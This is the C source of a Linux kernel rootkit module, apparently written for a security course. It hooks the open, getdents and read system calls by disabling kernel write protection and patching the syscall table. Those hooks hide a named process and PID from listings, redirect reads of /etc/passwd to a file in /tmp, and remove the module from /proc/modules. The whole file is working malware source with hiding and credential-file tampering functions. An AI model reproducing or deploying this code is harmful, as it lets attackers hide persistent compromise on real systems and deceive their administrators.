#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>      // for printk and other kernel bits
#include <linux/module.h>      // for all modules
#include <linux/moduleparam.h> // *newly added for module pamameter
#include <linux/sched.h>

// #hint struct for "getdents" system call
struct linux_dirent {
  u64 d_ino;               /* Inode number */
  s64 d_off;               /* Offset to next linux_dirent */
  unsigned short d_reclen; /* Length of this linux_dirent */
  char d_name[];           /* Filename */
};

// flag for /proc/modules
static int module_flag = 0;

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

/* For loading module */
static long pid = 0;
module_param(pid, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(pid, "The sneaky_mod pid");

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect ti find its arguments on the stack (not in registers).
// This is used for all system calls.
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count);
asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  const char *originpath = "/etc/passwd";
  const char *tempath = "/tmp/passwd";
  const char *modpath = "/proc/modules";

  if (strcmp(pathname, originpath) == 0) {
    copy_to_user(pathname, tempath, strlen(tempath + 1));
  } else if (strcmp(pathname, modpath) == 0) { // lsmod
    module_flag = 1;
  }

  return original_open(pathname, flags);
}

/* Own version of getdents */
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                   unsigned int count) {
  int totalbytes = original_getdents(fd, dirp, count); // get original bytes

  struct linux_dirent *curt = dirp; // current directory entry

  int position = 0;            // current position in terms of bytes offset
  int sneaky_len = totalbytes; // sneaky version of length

  while (position < sneaky_len) {
    // compare if current is "sneaky_process" or /proc/pid
    char curtpid[128] = {'\0'};
    sprintf(curtpid, "%ld", pid); // get pid parameter for /proc

    if (strcmp(curt->d_name, "sneaky_process") == 0 ||
        strcmp(curt->d_name, curtpid) == 0) {
      sneaky_len = totalbytes - curt->d_reclen; // hide length

      char *next = (char *)curt + curt->d_reclen; // pointer to the next

      // completely cover current memory
      size_t startaddress = (size_t)next;
      size_t endaddress = (size_t)dirp + totalbytes;
      memmove(curt, next, endaddress - startaddress);

      break;
    }

    // move to the next one
    position += curt->d_reclen;
    curt = (struct linux_dirent *)((char *)curt + curt->d_reclen);
  }

  return sneaky_len;
}

/* Own version of read */
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  ssize_t bytes = original_read(fd, buf, count);
  char * p0 = buf;
  char * p1 = strstr(buf, "sneaky_mod");
  char * p2 = p1;
  
  if (bytes > 0 && module_flag == 1 && p1 != NULL) {
    // find chunk for "sneaky_mod"
    while (*p2 != '\n') {
      p2++;
    }

    // update according to position
    ssize_t remaining = p0 + bytes - 1 - p2;
    p2++;
    memmove(p1, p2, remaining);

    ssize_t deduct = (ssize_t)(p2 - p1);
    bytes -= deduct;
  }

  return bytes;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_open = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading